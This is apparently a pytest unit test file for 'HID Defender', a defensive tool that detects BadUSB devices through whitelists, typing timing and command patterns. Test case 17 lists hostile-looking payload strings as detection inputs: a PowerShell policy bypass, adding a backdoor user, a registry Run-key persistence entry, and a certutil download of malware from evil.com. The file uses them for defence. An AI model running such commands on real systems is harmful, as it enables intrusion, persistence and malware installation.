"""
CHAPTER 4: TESTING AND ANALYSIS
Unit Test Cases 1–20 — HID Defender

Each test class / function name matches the test case number so they
can be discovered and run individually from the dashboard.
"""

import csv
import json
import os
import tempfile
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# ── Path setup ────────────────────────────────────────────────────────────────
import sys
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

import hid_defender.config as config
import hid_defender.device_validator as device_validator
import hid_defender.logging_setup as logging_setup
import hid_defender.alert_system as alert_system

# ── Shared fixtures ───────────────────────────────────────────────────────────

@pytest.fixture
def whitelist_file(tmp_path):
    """Temporary whitelist with two trusted devices."""
    data = [
        {"hardware_id": "VID_046D&PID_C077", "vendor": "Logitech",  "name": "USB Mouse"},
        {"hardware_id": "VID_1B1C&PID_1BAC", "vendor": "Corsair",   "name": "Gaming Keyboard"},
    ]
    p = tmp_path / "trusted_devices.json"
    p.write_text(json.dumps(data))
    return p


@pytest.fixture
def log_file(tmp_path):
    return tmp_path / "hid_alerts.log"


@pytest.fixture(autouse=True)
def patch_paths(tmp_path, monkeypatch, whitelist_file, log_file):
    monkeypatch.setattr("hid_defender.config.WHITELIST_PATH",          str(whitelist_file))
    monkeypatch.setattr("hid_defender.device_validator.WHITELIST_PATH", str(whitelist_file))
    monkeypatch.setattr("hid_defender.logging_setup.LOG_PATH",          str(log_file))


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 1 — System Startup
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase01_SystemStartup:
    """TC-UNIT-01: System Startup"""

    def test_system_startup(self):
        """
        Objective : Verify system startup.
        Action    : Initialise logger and load whitelist.
        Expected  : Logger created, whitelist loaded as list, no exceptions.
        """
        logger    = logging_setup.init_logger("INFO")
        whitelist = device_validator.get_whitelist()

        assert logger   is not None,       "Logger should be initialised"
        assert isinstance(whitelist, list), "Whitelist should be a list"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 2 — USB Device Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase02_USBDeviceDetection:
    """TC-UNIT-02: USB Device Detection"""

    def test_usb_device_detection(self):
        """
        Objective : Verify USB device detection.
        Action    : Mock wmic output with one HID device.
        Expected  : At least one device returned in list.
        """
        import hid_defender.device_monitor as device_monitor

        mock_csv = (
            "Node,Caption,Manufacturer,Name,PNPDeviceID\n"
            ",USB Mouse,Logitech,USB Mouse,USB\\VID_046D&PID_C077\\1\n"
        )
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.stdout     = mock_csv
            mock_run.return_value.returncode = 0
            devices = device_monitor.get_windows_usb_devices_wmic()

        assert isinstance(devices, list), "Should return a list"
        assert len(devices) >= 1,         "Should detect at least one device"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 3 — Device Information Extraction
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase03_DeviceInformationExtraction:
    """TC-UNIT-03: Device Information Extraction"""

    def test_device_information_extraction(self):
        """
        Objective : Verify device information extraction.
        Action    : Parse a raw device dict through parse_device().
        Expected  : Result contains time, name, vendor, product, id fields.
        """
        raw = {
            "time":    "2026-01-01 12:00:00",
            "name":    "USB Mouse",
            "vendor":  "Logitech",
            "product": "USB Mouse",
            "id":      "USB\\VID_046D&PID_C077\\1",
        }
        parsed = device_validator.parse_device(raw)

        for field in ("time", "name", "vendor", "product", "id"):
            assert field in parsed, f"Field '{field}' missing from parsed device"
        assert parsed["name"] == "USB Mouse"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 4 — Whitelist Validation
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase04_WhitelistValidation:
    """TC-UNIT-04: Whitelist Validation"""

    def test_whitelist_validation_trusted(self):
        """
        Objective : Verify whitelist validation returns TRUSTED for known device.
        Action    : Evaluate a device whose VID&PID is in whitelist.
        Expected  : Result == TRUSTED, action == ALLOWED.
        """
        whitelist = device_validator.get_whitelist()
        device = {
            "name":    "USB Mouse",
            "vendor":  "Logitech",
            "product": "USB Mouse",
            "id":      "USB\\VID_046D&PID_C077\\1",
        }
        result, action, reason = device_validator.evaluate(device, whitelist)

        assert result == "TRUSTED", f"Expected TRUSTED, got {result}"
        assert action == "ALLOWED", f"Expected ALLOWED, got {action}"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 5 — Unknown Device Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase05_UnknownDeviceDetection:
    """TC-UNIT-05: Unknown Device Detection"""

    def test_unknown_device_detection(self):
        """
        Objective : Verify unknown device detection flags device as UNTRUSTED.
        Action    : Evaluate a device not in whitelist and not a known brand.
        Expected  : Result == UNTRUSTED, action == BLOCKED.
        """
        whitelist = device_validator.get_whitelist()
        device = {
            "name":    "Unknown HID Device",
            "vendor":  "Generic Corp",
            "product": "Unknown HID",
            "id":      "USB\\VID_DEAD&PID_BEEF\\1",
        }
        result, action, reason = device_validator.evaluate(device, whitelist)

        assert result == "UNTRUSTED", f"Expected UNTRUSTED, got {result}"
        assert action == "BLOCKED",   f"Expected BLOCKED, got {action}"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 6 — Whitelist File Loading
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase06_WhitelistFileLoading:
    """TC-UNIT-06: Whitelist File Loading"""

    def test_whitelist_file_loading(self):
        """
        Objective : Verify whitelist file loading reads correct entries.
        Action    : Call get_whitelist() with a pre-populated JSON file.
        Expected  : Returns list with 2 entries containing correct hardware_ids.
        """
        whitelist = device_validator.get_whitelist()

        assert len(whitelist) == 2
        ids = [e["hardware_id"] for e in whitelist]
        assert "VID_046D&PID_C077" in ids
        assert "VID_1B1C&PID_1BAC" in ids


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 7 — Empty Whitelist Handling
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase07_EmptyWhitelistHandling:
    """TC-UNIT-07: Empty Whitelist Handling"""

    def test_empty_whitelist_handling(self, tmp_path, monkeypatch):
        """
        Objective : Verify empty whitelist handling.
        Action    : Point whitelist path to an empty JSON array file.
        Expected  : Returns empty list, no exceptions raised.
        """
        empty = tmp_path / "empty.json"
        empty.write_text("[]")
        monkeypatch.setattr("hid_defender.device_validator.WHITELIST_PATH", str(empty))

        whitelist = device_validator.get_whitelist()

        assert isinstance(whitelist, list)
        assert len(whitelist) == 0


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 8 — Invalid Whitelist Handling
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase08_InvalidWhitelistHandling:
    """TC-UNIT-08: Invalid Whitelist Handling"""

    def test_invalid_whitelist_handling(self, tmp_path, monkeypatch):
        """
        Objective : Verify invalid whitelist handling — corrupt JSON.
        Action    : Point whitelist path to a file with invalid JSON.
        Expected  : Returns empty list gracefully, no crash.
        """
        bad = tmp_path / "bad.json"
        bad.write_text("{invalid json ][")
        monkeypatch.setattr("hid_defender.device_validator.WHITELIST_PATH", str(bad))

        whitelist = device_validator.get_whitelist()

        assert isinstance(whitelist, list)
        assert len(whitelist) == 0


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 9 — Log File Creation
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase09_LogFileCreation:
    """TC-UNIT-09: Log File Creation"""

    def test_log_file_creation(self, log_file):
        """
        Objective : Verify log file creation when first event is logged.
        Action    : Write a CSV event row to the log file.
        Expected  : Log file is created and exists on disk.
        """
        log_file.parent.mkdir(parents=True, exist_ok=True)
        with log_file.open("w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Time", "Device", "Vendor", "Product", "ID", "Result", "Action", "Reason"])
            writer.writerow(["2026-01-01 12:00:00", "Test Device", "Test", "Test",
                             "VID_TEST&PID_TEST", "UNTRUSTED", "BLOCKED", "Unit test"])

        assert log_file.exists(), "Log file should be created"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 10 — Suspicious Event Logging
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase10_SuspiciousEventLogging:
    """TC-UNIT-10: Suspicious Event Logging"""

    def test_suspicious_event_logging(self, log_file):
        """
        Objective : Verify suspicious event logging writes UNTRUSTED row.
        Action    : Write an UNTRUSTED device event to CSV log, read it back.
        Expected  : Log contains UNTRUSTED result entry.
        """
        log_file.parent.mkdir(parents=True, exist_ok=True)
        with log_file.open("w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Time", "Device", "Vendor", "Product", "ID", "Result", "Action", "Reason"])
            writer.writerow(["2026-01-01 12:00:00", "Suspicious Device", "Unknown", "Unknown",
                             "VID_DEAD&PID_BEEF", "UNTRUSTED", "BLOCKED", "Unknown HID device"])

        content = log_file.read_text(encoding="utf-8")
        assert "UNTRUSTED" in content, "Log should contain UNTRUSTED entry"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 11 — Alert Generation
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase11_AlertGeneration:
    """TC-UNIT-11: Alert Generation"""

    def test_alert_generation(self):
        """
        Objective : Verify alert generation does not crash on untrusted device.
        Action    : Call show_alert() with a mock device dict.
        Expected  : Function completes without raising an exception.
        """
        device = {"name": "BadUSB", "vendor": "Unknown",
                  "product": "BadUSB", "id": "VID_DEAD&PID_BEEF"}

        with patch("hid_defender.alert_system.subprocess.Popen"), \
             patch("hid_defender.alert_system.threading.Thread"):
            try:
                alert_system.show_alert(device)
            except Exception as exc:
                pytest.fail(f"show_alert() raised an exception: {exc}")


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 12 — Keystroke Speed Calculation
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase12_KeystrokeSpeedCalculation:
    """TC-UNIT-12: Keystroke Speed Calculation"""

    def test_keystroke_speed_calculation(self):
        """
        Objective : Verify keystroke speed calculation threshold from config.
        Action    : Read KEYSTROKE_THRESHOLD from config.
        Expected  : Threshold is a positive integer (default 15).
        """
        assert isinstance(config.KEYSTROKE_THRESHOLD, int),     "Threshold should be int"
        assert config.KEYSTROKE_THRESHOLD > 0,                   "Threshold should be positive"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 13 — Abnormal Typing Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase13_AbnormalTypingDetection:
    """TC-UNIT-13: Abnormal Typing Detection"""

    def test_abnormal_typing_detection(self):
        """
        Objective : Verify abnormal typing detection via MALICIOUS_PATTERNS list.
        Action    : Check that typical BadUSB payloads appear in MALICIOUS_PATTERNS.
        Expected  : 'powershell' and 'cmd.exe' are in the patterns list.
        """
        patterns = [p.lower() for p in config.MALICIOUS_PATTERNS]
        assert any("powershell" in p for p in patterns), "'powershell' not in MALICIOUS_PATTERNS"
        assert any("cmd"        in p for p in patterns), "'cmd' not in MALICIOUS_PATTERNS"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 14 — Normal Typing Behavior
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase14_NormalTypingBehavior:
    """TC-UNIT-14: Normal Typing Behavior"""

    def test_normal_typing_behavior(self):
        """
        Objective : Verify normal typing behavior is not flagged.
        Action    : Evaluate a whitelisted device (normal user keyboard).
        Expected  : Result is TRUSTED or SAFE, not UNTRUSTED.
        """
        whitelist = device_validator.get_whitelist()
        device = {"name": "Gaming Keyboard", "vendor": "Corsair",
                  "product": "Gaming Keyboard", "id": "USB\\VID_1B1C&PID_1BAC\\1"}

        result, action, reason = device_validator.evaluate(device, whitelist)
        assert result in ("TRUSTED", "SAFE"), f"Normal keyboard flagged as {result}"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 15 — First Input Delay Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase15_FirstInputDelayDetection:
    """TC-UNIT-15: First Input Delay Detection"""

    def test_first_input_delay_detection(self):
        """
        Objective : Verify first input delay threshold is defined.
        Action    : Read FIRST_INPUT_DELAY_THRESHOLD from config.
        Expected  : Value is a positive number (default 1 second).
        """
        threshold = config.FIRST_INPUT_DELAY_THRESHOLD
        assert isinstance(threshold, (int, float)), "Delay threshold should be numeric"
        assert threshold > 0,                        "Delay threshold should be positive"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 16 — Abnormal Delay Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase16_AbnormalDelayDetection:
    """TC-UNIT-16: Abnormal Delay Detection"""

    def test_abnormal_delay_detection(self):
        """
        Objective : Verify abnormal (very short) delay triggers attack suspicion.
        Action    : Simulate first-input delay below threshold (0.1s vs 1s).
        Expected  : A delay < threshold is considered abnormal (BadUSB pattern).
        """
        threshold   = config.FIRST_INPUT_DELAY_THRESHOLD
        fast_delay  = 0.1  # seconds — automated payload fires instantly
        is_abnormal = fast_delay < threshold

        assert is_abnormal, "A sub-threshold delay should be considered abnormal"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 17 — Suspicious Command Detection
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase17_SuspiciousCommandDetection:
    """TC-UNIT-17: Suspicious Command Detection"""

    @pytest.mark.parametrize("payload", [
        "powershell -ExecutionPolicy Bypass -File payload.ps1",
        "cmd.exe /c net user hacker P@ss /add",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "certutil -urlcache -split -f http://evil.com/malware.exe",
    ])
    def test_suspicious_command_detection(self, payload):
        """
        Objective : Verify suspicious command detection flags BadUSB payloads.
        Action    : Check payload against MALICIOUS_PATTERNS.
        Expected  : At least one pattern from the config matches.
        """
        matched = any(
            pattern.lower() in payload.lower()
            for pattern in config.MALICIOUS_PATTERNS
        )
        assert matched, f"Payload not detected: {payload}"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 18 — Dashboard Update
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase18_DashboardUpdate:
    """TC-UNIT-18: Dashboard Update"""

    def test_dashboard_update(self, log_file, monkeypatch):
        """
        Objective : Verify dashboard reads log events correctly.
        Action    : Write a CSV log file and read it back.
        Expected  : Dashboard can parse the log and return event data.
        """
        log_file.write_text(
            "Time,Device,Vendor,Product,ID,Result,Action,Reason\n"
            "2026-01-01 12:00:00,USB Mouse,Logitech,USB Mouse,"
            "VID_046D&PID_C077,TRUSTED,ALLOWED,Whitelisted device\n",
            encoding="utf-8"
        )

        rows = []
        with log_file.open(newline="", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            for row in reader:
                rows.append(row)

        assert len(rows) == 1
        assert rows[0]["Result"] == "TRUSTED"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 19 — Multiple Device Handling
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase19_MultipleDeviceHandling:
    """TC-UNIT-19: Multiple Device Handling"""

    def test_multiple_device_handling(self):
        """
        Objective : Verify multiple device handling evaluates each independently.
        Action    : Evaluate 3 different devices against whitelist.
        Expected  : Each device gets its own correct result (TRUSTED / UNTRUSTED).
        """
        whitelist = device_validator.get_whitelist()
        devices = [
            {"name": "USB Mouse",   "vendor": "Logitech", "product": "Mouse",
             "id": "USB\\VID_046D&PID_C077\\1"},
            {"name": "BadUSB",      "vendor": "Unknown",  "product": "BadUSB",
             "id": "USB\\VID_DEAD&PID_BEEF\\1"},
            {"name": "KB",          "vendor": "Corsair",  "product": "KB",
             "id": "USB\\VID_1B1C&PID_1BAC\\1"},
        ]

        results = [device_validator.evaluate(d, whitelist)[0] for d in devices]
        assert results[0] == "TRUSTED",   "Logitech Mouse should be TRUSTED"
        assert results[1] == "UNTRUSTED", "Unknown BadUSB should be UNTRUSTED"
        assert results[2] == "TRUSTED",   "Corsair KB should be TRUSTED"


# ══════════════════════════════════════════════════════════════════════════════
#  UNIT TEST CASE 20 — Error Handling
# ══════════════════════════════════════════════════════════════════════════════
class TestUnitCase20_ErrorHandling:
    """TC-UNIT-20: Error Handling"""

    def test_error_handling_missing_whitelist(self, tmp_path, monkeypatch):
        """
        Objective : Verify error handling when whitelist file is missing.
        Action    : Point whitelist path to a non-existent file.
        Expected  : Returns empty list, no exception raised.
        """
        monkeypatch.setattr("hid_defender.device_validator.WHITELIST_PATH",
                            str(tmp_path / "nonexistent.json"))

        whitelist = device_validator.get_whitelist()
        assert isinstance(whitelist, list)
        assert len(whitelist) == 0

    def test_error_handling_bad_device_id(self):
        """
        Objective : Verify error handling when device has missing/empty ID.
        Action    : Evaluate a device with no 'id' field.
        Expected  : Returns UNKNOWN or UNTRUSTED — does not crash.
        """
        whitelist = device_validator.get_whitelist()
        device    = {"name": "Broken Device", "vendor": "", "product": "", "id": ""}

        try:
            result, action, reason = device_validator.evaluate(device, whitelist)
            assert result in ("UNKNOWN", "UNTRUSTED", "SAFE")
        except Exception as exc:
            pytest.fail(f"evaluate() crashed on bad device ID: {exc}")
